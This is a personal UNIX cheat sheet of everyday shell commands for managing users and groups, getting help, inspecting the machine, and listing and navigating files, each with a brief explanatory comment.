-*- eval: (visual-line-mode 0) -*- #
# .always_forget.txt
#
# awdeorio's UNIX cheat sheet
#
# Andrew DeOrio <awdeorio@umich.edu>

# Users and Groups
adduser USER                            # add USER (Debian)
adduser --disabled-password --gecos ""  # ^^^ scriptable
adduser USER GROUP                      # add USER to GROUP (Debian)
adduser --system --no-create-home --uid 8000 blueflow  # add daemon user
groupadd --system --gid 8000 nogroup    # add daemon group
useradd USER                            # add USER, native binary
useradd -m -G users,wheel -s /bin/bash USER # add new USER manually
useradd --system                        # no homedir, no passwd, can't log in
deluser USER                            # remove a user
delgroup GROUP                          # remove a group
usermod -u UID USER                     # change UID
usermod -g GID USER                     # change default group
groupmod -g GID group                   # change GID of group
gpasswd -a USER GROUP                   # add USER to GROUP
usermod -aG GROUP USER                  # add USER to GROUP
smbpasswd -a USER                       # new Samba user
chsh -s /usr/local/bin/bash             # change default shell
chsh -s /usr/local/bin/bash USER        # change default shell for USER
id                                      # print user and group ID #'s
id -un                                  # print effective user name
id -gn                                  # print effective group name
getent passwd USER                      # check if user exists
getent group GROUP                      # check if group exists
ulimit -a                               # per-user system limits
groups                                  # list group membership
users                                   # list users logged in
w                                       # list users logged in
who                                     # list users logged in
finger USER                             # directory info about USER
whoami                                  # current user
logname                                 # current logged in user (e.g., w/ sudo)
passwd                                  # change your password
passwd USER                             # change USER's password
echo "USER:NEW_PASSWORD" | chpasswd     # change USER's password, batch
chage -E 2000-01-01 USER                # disable login with past expiration
usermod --expiredate 1 USER             # same thing
chage -E -1 USER                        # password never expires
passwd --lock                           # lock an account (SSH key access OK)
USER=$(stat -c '%U' PATH)               # check user in a script
GROUP=$(stat -c '%G' PATH)              # check group in a scrip

# Help
man CMD                                 # User manual for CMD
man -w                                  # Show search path for man pages
echo $MANPATH                           # Additional man search dirs
apropos                                 # Search commands and descriptions
whatis CMD                              # Short description of a command
tldr CMD                                # Short examples of a command

# Machines
hostname                                # name of this computer
uname                                   # operating system name
uname -a                                # info about OS, compiler, etc.
$OSTYPE                                 # operating system name (bash)
[[ "$OSTYPE" == "darwin"* ]]            # Check for macOS
cat /proc/cpuinfo                       # CPU size/features
cat /proc/meminfo                       # memory size/features
uptime                                  # time since power on
lspci                                   # list PCI devices
lspci -vv                               # ^^^ with lots of info

# Files and folders
ls                                      # list directory contents
ls -l                                   # include time, size, etc.
ls -a                                   # include hidden files
ls -A                                   # include hidden files, but not . or ..
ls -t                                   # sort by time
ls -ltr                                 # newest files last
ls -ltr --time-style=long-iso           # ^^^ time in YYYY-MM-DD HH:SS format
ls --color                              # colorize output
ls --color=auto                         # colorize output only in tty
ls --human-readable                     # human-readable file sizes
ls --ignore-backups                     # ignore *~ files
ls --ignore $'Icon\r'"                  # ignore OSX Icon files
ls --quoting-style=literal              # don't quote for 'File with spaces'
ls -R                                   # list recursively
tree                                    # list recursively in pretty format
tree -I 'env|__pycache__|*.egg-info'    # ignore Python bins
tree -I 'node_modules'                  # ignore JavaScript bins
tree -a -I .git                         # include hidden, exclude .git
tree -a -I '.git|env|__pycache__|*.egg-info|node_modules'  # Web projects
tree --gitignore                        # ignore files in .gitignore
tree --gitignore -a -I .git             # ignore files in .gitignore, w/ hidden
tree -l                                 # follow symlinks to directories
mkdir DIR                               # make a directory
mkdir -p DIR                            # ^^^ make intermediate dirs as needed
rmdir DIR                               # remove a directory
rm FILE                                 # remove a file
rm -r DIR                               # remove directory and files
rm -rf DIR                              # ^^^ and don't ask any questions
shred -u FILE                           # overwrite file with junk before remove
dircolors                               # set LS_COLORS using defaults
dircolors -b                            # ^^^ for Bourne shell
dircolors -b ${HOME}/.DIR_COLORS        # ^^^ with custom colors
stat FILE                               # file modification times, etc.
touch FILE                              # create empty file, if it doesn't exist
touch FILE                              # update mtime, atime to NOW
ln -s FILE1 FILE2                       # create soft link
ln -s -t DIR FILE                       # create soft link in DIR

# Paths and files
pwd                                     # current directory
pwd -P                                  # current directory, absolute path
readlink -f PATH                        # absolute path (GNU only)
cd                                      # change to home directory
cd ..                                   # change to directory up
cd DIR                                  # change to directory
cd -                                    # return to previous directory (bash)
cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced bash script
cd $(dirname "$0") && pwd -P            # absolute path of executed bash script
realpath DIR                            # absolute path of DIR
